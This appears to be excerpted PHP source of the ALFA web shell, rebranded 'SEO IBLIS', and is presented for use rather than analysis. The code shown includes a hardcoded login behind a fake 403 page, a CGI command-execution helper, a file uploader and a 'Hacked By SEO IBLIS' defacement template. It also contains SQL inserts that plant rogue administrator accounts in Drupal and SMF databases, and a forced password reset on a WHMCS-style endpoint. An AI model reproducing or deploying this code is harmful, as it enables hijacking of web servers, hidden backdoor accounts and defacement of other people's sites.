...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => '9d7989825d8c0f13e72e46476bfc51ea03dc46c8',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
define("__ALFA_DATA_FOLDER__", "IBLISDATACGI");
...
<head>
  ...
  <link rel="icon" href="https://i.postimg.cc/ncTJ7h43/photo-2024-10-06-13-56-19-removebg-preview.png" type="image/x-icon">
...
<body>
    <div class="wrapper">
        <form action="" method="POST" class="form">
            <h1 class="title">$ SEO TUSBOL WASS HERE $</h1>
			<p>..: Satset Entod Raya ::..</p>
            <div class="inp">
                <input type="text" name="password" class="input" placeholder="PIN Masuk">
                <i class="fa fa-key"></i>
            </div>
         
            <button class="submit"><i class="fa fa-sign-in"></i> Masuk</button>
        </form>
        <div></div>
        <div class="banner">
            <h1 class="wel_text"><img src="https://i.postimg.cc/ncTJ7h43/photo-2024-10-06-13-56-19-removebg-preview.png" width="300"></h1><br>
            <p class="para"></p>
        </div>
    </div>
</body>
...
<title>..:: SEO TUSBOL WASS HERE ::..</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://i.ibb.co.com/W6Y9Ty0/il-1080x-N-3257660210-emoi-removebg-preview.png" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ https://i.postimg.cc/ncTJ7h43/photo-2024-10-06-13-56-19-removebg-preview.png'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		...
		if(isset($_COOKIE["alfacgiapi"])){
			if(!@file_exists("IBLISCGIAPI/".$_COOKIE["alfacgiapi"].".alfa")){
				$recreate = true;
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://i.ibb.co.com/W6Y9Ty0/il-1080x-N-3257660210-emoi-removebg-preview.png" /></td>
</tr>
<tr>
...
function __showicon($r){
	...
	$s['alfamini']='https://i.postimg.cc/ncTJ7h43/photo-2024-10-06-13-56-19-removebg-preview.png';
	$s['loader']='https://i.ibb.co.com/pvf43R7/images-removebg-preview.png';
...
if(empty($about_us)){
$about_us = "<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css'>
<pre><center><img src='https://i.ibb.co.com/pvf43R7/images-removebg-preview.png'><br>
<b><font size='+3' color='#00A220'><i class='fa fa-bug'></i> SEO PENIKUNG <i class='fa fa-bug'></i></font><br><b>
<font color='#00A220'>Shell Coded By SEO IBLIS </font><br>
...
$create = "insert into tblclients (email) values('zewarganss@gmail.com')";
...
$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=zewarganss@gmail.com");
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[./SEO-IBLIS &copy; ".date('Y')." ]</span></div></td>
</tr>
</table>
</div>
...
<textarea name=index rows='19' cols='103'><title>Hacked By SEO IBLIS</title><b>Hacked By SEO IBLIS</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
<title>Hacked By SEO IBLIS</title><b>Hacked By SEO IBLIS</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
$table = array('td1' =>
 ...
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'zewarganss@gmail.com', 'inputSize' => '50')
);
create_table($table);
...
$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','zewarganss@gmail.com','filtered_html','1','Europe/Berlin','zewarganss@gmail.com')") or die(mysqli_error($conn));
...
$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','zewarganss@gmail.com')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://i.ibb.co.com/pvf43R7/images-removebg-preview.png\"></p>";
